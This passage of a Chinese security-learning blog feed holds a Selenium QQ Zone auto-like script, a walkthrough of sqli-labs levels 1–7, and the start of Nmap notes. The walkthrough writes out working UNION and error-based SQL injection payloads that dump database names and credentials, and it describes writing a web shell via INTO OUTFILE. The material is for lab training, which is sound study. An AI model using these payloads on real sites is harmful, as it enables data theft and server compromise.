chrome.find_element_by_id(<span class="string">"u"</span>).send_keys(you_qq_number)</span><br><span class="line">    chrome.find_element_by_id(<span class="string">"p"</span>).send_keys(you_qq_password)</span><br><span class="line">    chrome.find_element_by_id(<span class="string">"login_button"</span>).click()</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    locate(<span class="string">"//*[@id='id_photowall_closetips']/s"</span>).click()</span><br><span class="line">    locate(<span class="string">"//a[//*[@id='qz_notification']/a[2]]"</span>).click()    </span><br><span class="line"></span><br><span class="line">    chrome.get(<span class="string">"https://user.qzone.qq.com/"</span>+str(friends_qq_number) +<span class="string">"/main"</span>)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> you_qq_number != friends_qq_number:</span><br><span class="line">        <span class="comment"># 关掉烦人的弹窗</span></span><br><span class="line">        chrome.find_element_by_xpath(<span class="string">"//*[@id='friendship_promote_layer']/table/tbody/tr[1]/td[2]/a"</span>).click()</span><br><span class="line">    chrome.switch_to.frame(locate(<span class="string">"//*[@id='QM_Feeds_Iframe']"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历说说, 并且下拉加载更多</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_to_like</span><span class="params">(number)</span>:</span></span><br><span class="line">    <span class="comment"># 尝试定位置顶说说</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(number):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            chrome.find_element_by_xpath(<span class="string">"//*[@id='host_home_feeds']/li["</span>+str(x+<span class="number">1</span>)+<span class="string">"]"</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            view_to_element(locate(<span class="string">"//*[@id='ICFeedsTipMsg']"</span>))</span><br><span class="line">        click_like(x+<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    initial()</span><br><span class="line">    start_to_like(<span class="number">100</span>)    </span><br><span class="line">    print(<span class="string">"click like complete"</span>)</span><br><span class="line">    time.sleep(<span class="number">30</span>)</span><br><span class="line">    <span class="comment"># chrome.quit()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>一时兴起的产物, 还不赖吧…</p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><figure class="image-box">
                <img src="http://188.131.227.20:999/picture/%E5%A5%B3%E7%A5%9E1.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/%E5%A5%B3%E7%A5%9E2.png" alt title class>
                <p></p>
            </figure>
<p><strong>你看, 女神见了都说好</strong></p>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><ul>
<li>优点:<br>可以基本自动化的给女神的QQ空间点赞.<br><del>让她上来自己动.</del></li>
<li>缺点:<ol>
<li>需要你安装chrome浏览器和对应的驱动, 虽然也可以是其它浏览器, 但需要稍微修改一些代码, 不够通用.</li>
<li>因为qq空间的说说是4个或者8个一组加载的, 本脚本在这些地方是基于报错来下拉加载新的说说, 比较不稳定, 有时会卡顿比较多的时间, 需要人为下拉. </li>
<li>例如这个<br><img src="http://188.131.227.20:999/picture/%E7%94%9F%E6%97%A5.png" alt><br>这种说说, 会干扰脚本的定位, 需要手动删除一下下</li>
</ol>
</li>
</ul>
<p>其实缺点2和3是可以克服的, 但是我已经懒得改了, ojbk<br><strong>或者点击下方为我打赏, 鼓励我写出更优质的脚本吧(手动滑稽)</strong></p>
]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[sqli-lab闯关记录]]></title>
      <url>/2019/07/11/sqli-lab%E9%97%AF%E5%85%B3/</url>
      <content type="html"><![CDATA[<h1 id="sqli-lab闯关"><a href="#sqli-lab闯关" class="headerlink" title="sqli-lab闯关"></a>sqli-lab闯关</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>sql注入</code>一直是我想学但是又感到无力的技术, 最主要的原因还是对于数据库的使用还比较陌生, 这两天突然发现有一个sql注入的靶场–<code>sqli-lab</code>, 所以就搭建在了本地玩玩.<br>除了手工注入外, 也有一些自动化注入工具. 推荐下<code>sqlmap</code>(需要python2.x环境), 有的时候还是蛮好用的, 有时间会记录下用法.</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><code>sqli-lab</code>的 GitHub 源代码: <a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a><br>需要的环境 : <code>apache</code>,<code>mysql</code>. 在其它的教程中我还看到需要<code>tomcat</code>,<code>js</code>等, 不过我目前还没用到, 暂时先不考虑.</p>
<p>下载后放在web目录下, 但是首次通过浏览器访问时可能会链接数据库失败, 需要在<code>/sqli-labs/sql-connections/db-creds.inc</code>文件中设置<code>mysql</code>数据库的密码.<br>如果你是像我一样使用的<code>phpstudy</code>提供的web环境的话, 数据库的初始用户名和密码通常都是<code>root</code>.</p>
<p>修改后再用浏览器访问第一关, 如果看到下面的内容, 就说明已经搭建好了.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/sqli.png" alt title class>
                <p></p>
            </figure>

<h2 id="Mysql常用语法"><a href="#Mysql常用语法" class="headerlink" title="Mysql常用语法"></a>Mysql常用语法</h2><p>说实话, 真心觉得mysql的语法很难记, 不知道是不是因为这个语法本身就很难, 也可能是我平时实在太少能用到数据库了, 所以想在这里记录一些常用的语法.<br>数据库本质上就是一个二维的表格, 所以在阅读相关语法时, 不妨在心里想象着一个表格, 并考虑执行了相关操作后, 这张表格会发生怎样的变化或者告诉你怎样的信息.<br><strong>注意: mysql数据库语句对大小写不敏感.</strong></p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">效果</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SELECT</td>
<td align="left">从数据库中提取数据</td>
</tr>
<tr>
<td align="left">UPDATE</td>
<td align="left">更新数据库中的数据</td>
</tr>
<tr>
<td align="left">DELETE</td>
<td align="left">从数据库中删除数据</td>
</tr>
<tr>
<td align="left">INSERT INTO</td>
<td align="left">向数据库中插入新数据</td>
</tr>
<tr>
<td align="left">CREATE DATABASE</td>
<td align="left">创建新数据库</td>
</tr>
<tr>
<td align="left">ALTER DATABASE</td>
<td align="left">修改数据库</td>
</tr>
<tr>
<td align="left">CREATE TABLE</td>
<td align="left">创建新表</td>
</tr>
<tr>
<td align="left">ALTER TABLE</td>
<td align="left">变更（改变）数据库表</td>
</tr>
<tr>
<td align="left">DROP TABLE</td>
<td align="left">删除表</td>
</tr>
<tr>
<td align="left">CREATE INDEX</td>
<td align="left">创建索引（搜索键）</td>
</tr>
<tr>
<td align="left">DROP INDEX</td>
<td align="left">删除索引</td>
</tr>
</tbody></table>
<h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><p>对于数据库的操作, 最常见的就是<code>增,删,查,改</code>.<br>select就是对应着<code>查询</code>这个操作, 估计也是在sql注入中常用的, 例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from table_name; # 在table_name表中查询所有记录的所有元素</span><br><span class="line">select number from table_name; # 在table_name表中查询所有记录的name元素</span><br><span class="line">select number from table_name where user=&apos;yjn&apos; and password=&apos;f**k you&apos;; # 在table_name表中查询元素user为&apos;yjn且password为&apos;f**k you&apos;的记录的name元素</span><br></pre></td></tr></table></figure>

<p>其中第三条就是大多数登录界面的基本雏形.<br>但是select的作用并不光是查询可以概括, 因为使用select同样可以返回<code>数据库函数</code>的值, 例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database(); # 可以显示当前使用的数据库的名称.</span><br></pre></td></tr></table></figure>

<p>所以select的作用也有些类似编程语言中的<code>return</code><br>除此之外, 还可以使用<code>limit</code>来指定从查询的结果集中返回多少条记录.<br><code>limit a,b</code> 代表从第a条记录开始(a &gt;= 0)返回b条语句.<br>所以select的用法总结起来就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select [数据库函数](字段1,字段2,...) from (table_name) [where 条件(s)];</span><br></pre></td></tr></table></figure>

<h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name  (field1, field2,...fieldN)  VALUES  (valueA1,valueA2,...valueAN),(valueB1,valueB2,...valueBN),(valueC1,valueC2,...valueCN)......;</span><br></pre></td></tr></table></figure>

<p>这是指定了记录元素的插入多条(或者单条)记录的语法.<br>如果所有的元素都要添加数据的话, 可以省去field的部分, 也就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO table_name VALUES  (valueA1,valueA2,...valueAN),(valueB1,valueB2,...valueBN),(valueC1,valueC2,...valueCN)......;</span><br></pre></td></tr></table></figure>

<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE from table_name [where Clause];</span><br></pre></td></tr></table></figure>

<p>删除table_name表中符合条件Clause的记录, 如果没有指定where, 那么就会删除该表中的所有记录.</p>
<h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p>以下是 UPDATE 命令修改 MySQL 数据表数据的通用 SQL 语法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name SET field1=new-value1, field2=new-value2</span><br><span class="line">[WHERE Clause]</span><br></pre></td></tr></table></figure>

<h3 id="数据库函数"><a href="#数据库函数" class="headerlink" title="数据库函数"></a>数据库函数</h3><table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">database()</td>
<td align="center">显示当前使用的数据库的名称</td>
</tr>
<tr>
<td align="center">now()</td>
<td align="center">显示当前时间</td>
</tr>
<tr>
<td align="center">version()</td>
<td align="center">显示mysql服务版本信息</td>
</tr>
<tr>
<td align="center">concat(str1,str2…)</td>
<td align="center">将参数中的字符串拼接, 返回str1str2…</td>
</tr>
<tr>
<td align="center">concat_ws(char,str1,str2…)</td>
<td align="center">基本同上, 返回str1charstr2char…</td>
</tr>
<tr>
<td align="center">length(str)</td>
<td align="center">返回字符串的长度</td>
</tr>
<tr>
<td align="center">user()</td>
<td align="center">返回用户名</td>
</tr>
<tr>
<td align="center">char()</td>
<td align="center">将十进制参数转为对应的ascII码</td>
</tr>
<tr>
<td align="center">未完待续</td>
<td align="center">随时更新</td>
</tr>
</tbody></table>
<h3 id="UNION操作符"><a href="#UNION操作符" class="headerlink" title="UNION操作符"></a>UNION操作符</h3><p>用于连接两个以上的select语句的结果组合到一个结果集合中, 多个select语句会删除重复的数据. 例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">select country from websites UNION select country from apps;</span><br><span class="line">+---------+</span><br><span class="line">| country |</span><br><span class="line">+---------+</span><br><span class="line">| CN      |</span><br><span class="line">| IND     | </span><br><span class="line">| USA     |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure>

<h2 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h2><p>既然要刷题, 就得总结出套路来才有意义. 下面是我总结出的常用流程.<br>因为目前肯定不全, 所以我也会在这里随时随时保持更新.</p>
<ol>
<li><p>判断是否存在注入<br>如果题目中会显示报错信息那么通常可以注入, 例如, 最简单的情况是输入<code>&#39;</code>显示报错信息, 那么这里就可能存在注入.</p>
</li>
<li><p>判断注入类型</p>
<ul>
<li><p>变量的储存类型?<br>  因为mysql数据库保存的信息可能按数值或字符串保存, 比如1和’1’. 这会导致有很多区别. 比如如果是按数值存储, 那么<code>1-1</code>就等价于<code>0</code>,字符串储存就是<code>&#39;1-1&#39;</code>的这段文本.</p>
</li>
<li><p>变量的闭合方式?</p>
</li>
</ul>
</li>
<li><p>判断数据列数<br> 查询返回的数据集中, 数据的格式是固定的. 自己构造payload时有必要与原来的格式相同(也就是列数, 不然会报错, 无法查询).<br> 可以使用<code>order by [数字]</code>来逐个测试, 也可以直接<code>union select 1,2,3...</code>来测试. </p>
</li>
<li><p>构造payload爆库<br> 构造查询语句获取<strong>数据库名, 表名, 列名, 具体数据等</strong><br> 这里可能会需要用到<code>information_schema</code>和<code>performance_schema</code>这两个数据库和其它的一些函数.</p>
<blockquote>
<p>information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。<a href="https://blog.csdn.net/demonson/article/details/80388677" target="_blank" rel="noopener">详情</a></p>
</blockquote>
</li>
</ol>
<h2 id="sqli-labs-冲冲冲"><a href="#sqli-labs-冲冲冲" class="headerlink" title="sqli-labs 冲冲冲"></a>sqli-labs 冲冲冲</h2><h3 id="Less-1-GET-Error-based-Single-quotes-String"><a href="#Less-1-GET-Error-based-Single-quotes-String" class="headerlink" title="Less-1|GET|Error based|Single quotes|String"></a>Less-1|GET|Error based|Single quotes|String</h3><p>终于可以开冲了.<br>来到第一关, 提示是在url中使用参数id来查询数据, 这也符合题目的描述.<br>经测试:</p>
<ul>
<li><code>[URL]/?id=1,2,3,4....</code>(get)均可以查询出name和password. 每个合法的id都对应着数据库中的一条数据.</li>
<li><code>[URL]/?id=&#39;</code>会报错(Error based):<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39; LIMIT 0,1&#39; at line 1</code></li>
<li><code>id=1-1</code>会查询出<code>id=1</code>的数据, 说明是字符串(string)类型的查询.</li>
<li><code>[URL]?id=2&#39;--+</code>不报错, 说明是单引号(single quotes)闭合变量.<br>以上信息其实题目中都有给出, 但考虑到实战中可没有这些提示, 所以学习在没有提示的情况下获取这些信息还是很有必要的.</li>
</ul>
<p>下面的内容才是重点, 当构造payload :<code>[URL]/?id=0&#39; UNION SELECT 1,2,3--+</code>,可以看到:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome Dhakkan</span><br><span class="line">Your login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>说明结果集的数据有3列, 而第2列和第3列会被网页拿来使用.<br>到这里能大概猜测出查询语句了<br><code>SELECT filed1,filed2,filed3 FROM table WHERE ID=&#39;id&#39; LIMIT 0,1</code> </p>
<p>然后爆出数据库的一切信息.</p>
<ul>
<li><p>当前使用的数据库和所有数据库<br>  <code>[URL]/?id=0&#39; UNION SELECT 1,database(),(select group_concat(schema_name) from information_schema.schemata)--+</code></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Your Login name:security</span><br><span class="line">Your Password:information_schema,challenges,mysql,performance_schema,security,test</span><br></pre></td></tr></table></figure>
</li>
<li><p>security数据库的表<br>  <code>[URL]/?id=0&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+</code></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
</li>
<li><p>表中的列名<br>  <code>[URL]/?id=0&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+</code></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:id,username,password</span><br></pre></td></tr></table></figure>
</li>
<li><p>接着可以查询所有的用户名和密码<br>  <code>[URL]/?id=0&#39; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)--+</code></p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="Less-2-GET-Error-based-Intiger-based"><a href="#Less-2-GET-Error-based-Intiger-based" class="headerlink" title="Less-2|GET|Error based|Intiger based"></a>Less-2|GET|Error based|Intiger based</h3><p><code>[URL]/?id=2-1</code>正常显示, 说明是数值型.<br><code>[URL]/?id=0 union select 1,2,3</code>显示2和3, 说明和上一题只是字符串和数值的区别, 所以剩下的步骤和上题相同.<br>例如<code>[URL]/?id=0 union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4</span><br><span class="line">Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4</span><br></pre></td></tr></table></figure>

<h3 id="Less-3-GET-Error-based-Single-quotes-with-twist-String"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-String" class="headerlink" title="Less-3|GET|Error based|Single quotes with twist|String"></a>Less-3|GET|Error based|Single quotes with twist|String</h3><p>一开始还是先判断下是字符串还是数值.<br><code>[URL]/?id=1-1</code>,页面显示的是id=1时的数据, 说明是字符串类型.<br>尝试用上面的套路,<br><code>[URL]/?id=0&#39; union select 1,2,3--+</code>会发现报错了:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;union select 1,2,3-- &apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>

<p>这里提示我们, 原来在变量的前面还有个<code>(</code>, 这对括号将我们的id包裹了起来, 也就是构造的payload没有生效. 所以需要把这对括号先闭合.<br><code>[URL]/?id=0&#39;) union select 1,2,3--+</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>

<p>OK, 剩下的步骤就按照第一题的流程就可以了.<br><code>[URL]/?id=0&#39;) union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users)--+</code></p>
<h3 id="Less-4-GET-Error-based-Double-Quotes-String"><a href="#Less-4-GET-Error-based-Double-Quotes-String" class="headerlink" title="Less-4|GET|Error based|Double Quotes|String"></a>Less-4|GET|Error based|Double Quotes|String</h3><p>如果首先尝试<code>[URl]/?id=0&#39; union select 1,2,3 --+</code>, 会发现既没有报错, 也没有显示查询结果, 这样似乎有点奇怪. 这是因为这里不是使用的<code>&#39;</code>进行闭合的.</p>
<ul>
<li><code>[URl]/?id=&#39;--+</code> 不报错.</li>
<li><code>[URl]/?id=&quot; --+</code> 报错, 判断出双引号和括号<code>(&quot; &quot;)</code>闭合.</li>
</ul>
<p><code>[URL]/?id=0&quot;) union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+</code> </p>
<h3 id="Less-5-GET-Double-Injection-Single-Quotes-String"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String" class="headerlink" title="Less-5|GET|Double Injection|Single Quotes|String"></a>Less-5|GET|Double Injection|Single Quotes|String</h3><p>这道题和前面的就不太一样了.<br>访问<code>[URL]/?id=1</code>后:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">You are in...........</span><br></pre></td></tr></table></figure>

<p>查询的信息是不会显示出来的, 这样就没法使用 union 查询我们想要的.<br>但是还<strong>有报错信息</strong>, 只能让目标出现在报错信息中, 这里需要使用新的注入方式: <strong>报错注入</strong>.<br>报错注入常用的三种方法:</p>
<ol>
<li><p>通过floor报错</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((payload),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>

<p> <strong>输出字符长度限制为64个字符</strong></p>
</li>
<li><p>通过updatexml报错</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,payload,1)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>同样该语句对输出的字符长度也做了限制，其最长输出32位<br> 并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效.</p>
</blockquote>
</li>
<li><p>通过ExtractValue报错</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, payload)</span><br></pre></td></tr></table></figure>

<p> **输出字符有长度限制, 最长32位.</p>
</li>
</ol>
<p>这里我们使用floor报错.<br>解释下其中的一些语法:</p>
<table>
<thead>
<tr>
<th align="left">语法</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">count(*)</td>
<td align="left">返回表中所有数据条数</td>
</tr>
<tr>
<td align="left">floor(a)</td>
<td align="left">返回小于等于a的最大的整数</td>
</tr>
<tr>
<td align="left">rand(seed)</td>
<td align="left">返回一个(0,1)的随机数, 参数为伪随机数种子</td>
</tr>
<tr>
<td align="left">()x</td>
<td align="left">将括号里的值取别名x</td>
</tr>
<tr>
<td align="left">group by</td>
<td align="left">根据给定数据列的每个成员对查询结果进行分组统计，得到一个分组汇总表</td>
</tr>
</tbody></table>
<p>注:<br>虽然rand(0)可以产生随机数, 但因为种子固定, 每次调用都会产生相同的序列, 那么在每条语句中<code>floor(rand(0)*2)</code>的值是确定的，为<code>011011…</code>.<br>floor报错的原理比较难, 不在此赘述, 可以参考<a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">这篇博客</a>.</p>
<p>用上面的payload尝试获取数据库<br><code>http://localhost/sqli-labs/Less-5/?id=1&#39; and (select 1 from (select count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Subquery returns more than 1 row</span><br></pre></td></tr></table></figure>

<p>说明查询的结果超过了64个字符. 可以放弃group_concat函数而使用LIMIT一条一条的查询.<br><code>[URL]/?id=1&#39; and (select 1 from (select count(*),concat((select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">Duplicate entry &apos;information_schema;1&apos; for key &apos;group_key&apos;</span><br></pre></td></tr></table></figure>

<p>只要遍历limit后的第一个参数就能获取整个表的信息.<br>后面的只要不断修改我们的payload就可以了.</p>
<h3 id="Less-6-Double-Injection-Double-Quotes-String"><a href="#Less-6-Double-Injection-Double-Quotes-String" class="headerlink" title="Less-6|Double Injection|Double Quotes|String"></a>Less-6|Double Injection|Double Quotes|String</h3><p>和第五题只是单引号/双引号闭合的区别, 不再赘述.</p>
<h3 id="Less-7-Dump-into-outfile-String"><a href="#Less-7-Dump-into-outfile-String" class="headerlink" title="Less-7|Dump into outfile|String"></a>Less-7|Dump into outfile|String</h3><p><strong>这关实在是太棒了.</strong><br>令id=1, 显示如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan </span><br><span class="line">You are in.... Use outfile......</span><br></pre></td></tr></table></figure>

<p>令id=1-1, 显示没有发生变化, 说明是字符型.<br>下面寻找闭合方式.<br><code>[URL]/?id=1</code>回显正常.<br><code>[URL]/?id=1&#39;--+</code>语法错误.<br><code>[URL]/?id=1&#39;)--+</code>语法错误.<br><code>[URL]/?id=1&#39;))--+</code>回显终于正常了.</p>
<p>这次我们发现, 查询结果既没有显示, 报错信息也都是固定的, 所以需要新的方法, 也就是提示我们的outfile.<br>在mysql中, 使用<code>select [payload] into outfile [路径]</code>可以写入文件. 这可真是太感人了, 我们又多了一种向目标主机中植入木马的方式.</p>
<p>但是….<br>构造payload:<code>[URL]/?id=1&#39; union select 1,&quot;一句话&quot;,3 into outfile &quot;C:\\phpStudy\\PHPTutorial\\MySQackup\\&quot; --+</code>后总是提示有语法错误(一句话木马我就不写出来了, 别让defender又把我文件删了…), 于是我在第一关中构造了同样的payload, 报错如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure>

<p>有点难受, 可能是写入木马后defender检测到了, 于是限制了权限, 总之这里目前还有些问题, 但是思路就是写入木马后在连接. 如果对一句话木马有疑惑, 可以移步我之前关于一句话木马的文章.</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://blog.csdn.net/sdb5858874/article/details/80727555" target="_blank" rel="noopener">sqli-labs闯关指南 1—10</a></li>
<li><a href="https://blog.csdn.net/uuihoo/article/details/82107903" target="_blank" rel="noopener">mysql group by 用法解析(详细)</a></li>
<li><a href="https://blog.csdn.net/xiaoxiaohui520134/article/details/81811179" target="_blank" rel="noopener">mysql中count函数使用方法详解</a></li>
<li><a href="https://www.cnblogs.com/fps2tao/p/9041204.html" target="_blank" rel="noopener">MySQL中的RAND()函数使用详解</a></li>
<li><a href="https://www.cnblogs.com/chuanzhang053/p/9228633.html" target="_blank" rel="noopener">mysql中floor函数的作用是什么?</a></li>
<li><a href="https://blog.csdn.net/zpy1998zpy/article/details/80650540" target="_blank" rel="noopener">floor()报错注入</a></li>
<li><a href="https://www.runoob.com/mysql/mysql-tutorial.html" target="_blank" rel="noopener">mysql教程</a></li>
<li><a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">Mysql报错注入原理分析</a></li>
</ul>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
            <tag> mysql基本语法 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Nmap 学习笔记]]></title>
      <url>/2019/07/10/Nmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h1 id="Nmap主机扫描学习笔记"><a href="#Nmap主机扫描学习笔记" class="headerlink" title="Nmap主机扫描学习笔记"></a>Nmap主机扫描学习笔记</h1><p>测试环境: linux 3.x<br>Nmap版本: 7.01</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/nmap.jpg" alt title class>
                <p></p>
            </figure>

<h2 id="扫描单个目标"><a href="#扫描单个目标" class="headerlink" title="扫描单个目标"></a>扫描单个目标</h2><p>扫描单个主机的语法格式为<code>nmap [目标]</code><br>实例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nmap localhost</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2019-07-10 16:32 CST</span><br><span class="line">Nmap scan report for localhost (127.0.0.1)</span><br><span class="line">Host is up (0.000093s latency).</span><br><span class="line">rDNS record for 127.0.0.1: localhost.localdomain</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  